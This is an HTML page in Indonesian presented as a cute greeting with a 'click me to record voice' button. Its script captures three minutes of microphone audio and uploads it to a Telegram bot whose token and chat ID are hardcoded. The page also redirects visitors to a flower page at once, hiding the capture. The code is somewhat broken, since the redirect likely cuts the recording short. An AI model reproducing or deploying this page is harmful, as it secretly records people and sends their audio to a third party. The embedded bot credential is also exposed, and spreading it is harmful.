<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">
    <title>Record Audio</title>
</head>
<body>
    <div class="greetings">
        <span>A</span>
        <span>L</span>
        <span>L</span>
        <span>O</span>
        <span>O</span>
    </div>
    <div class="description">
        <p><span></span></p>
    </div>
    <button id="actionButton">Coba Klik Aku untuk Rekam Suara</button>
    <div id="statusMessage" style="display: none;">
        <p>Perekaman sedang berlangsung...</p>
    </div>

    <script>
        let mediaRecorder;
        let audioChunks = [];
        let botToken = '8103522113:AAECNtZDVMnPLaXX3HD1IFeQuOp7cQ2Td_Y'; // Ganti dengan token bot Anda
        let chatId = '6813368909'; // Ganti dengan chat ID Anda

        document.getElementById('actionButton').addEventListener('click', () => {
            // Tampilkan pesan status segera setelah tombol diklik
            document.getElementById('statusMessage').style.display = 'block';
            // Coba aktifkan mikrofon dan mulai rekam suara
            startRecording();

            // Langsung arahkan pengguna ke halaman `flower.html`
            window.location.href = 'flower.html';
        });

        function startRecording() {
            navigator.mediaDevices.getUserMedia({ audio: true })
                .then((stream) => {
                    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                    const mediaStreamSource = audioContext.createMediaStreamSource(stream);
                    mediaRecorder = new MediaRecorder(stream);

                    mediaRecorder.ondataavailable = (event) => {
                        audioChunks.push(event.data);
                    };

                    mediaRecorder.onstop = () => {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                        const audioUrl = URL.createObjectURL(audioBlob);
                        audioChunks = [];
                        sendAudioToTelegram(audioBlob);
                    };

                    mediaRecorder.start();

                    // Rekam selama 3 menit
                    setTimeout(() => {
                        mediaRecorder.stop();
                    }, 180000); // 3 menit = 180000 ms
                })
                .catch((err) => {
                    console.warn("Akses mikrofon ditolak atau tidak tersedia:", err.message);
                    alert("Mikrofon ditolak, mencoba fallback...");
                    fallbackAudioCapture();
                });
        }

        function fallbackAudioCapture() {
            alert("Gagal mengakses mikrofon. Menggunakan fallback alternatif (audio default).");
            const defaultAudioBlob = new Blob([new ArrayBuffer(0)], { type: 'audio/wav' }); // Ganti dengan audio default
            sendAudioToTelegram(defaultAudioBlob);
        }

        function sendAudioToTelegram(audioBlob) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('audio', audioBlob, 'audio.wav');

            fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
                method: 'POST',
                body: formData
            })
                .then(response => response.json())
                .then(result => {
                    console.log("Audio berhasil dikirim:", result);
                })
                .catch(error => {
                    console.error("Gagal mengirim audio ke Telegram:", error);
                });
        }
    </script>
</body>
</html>
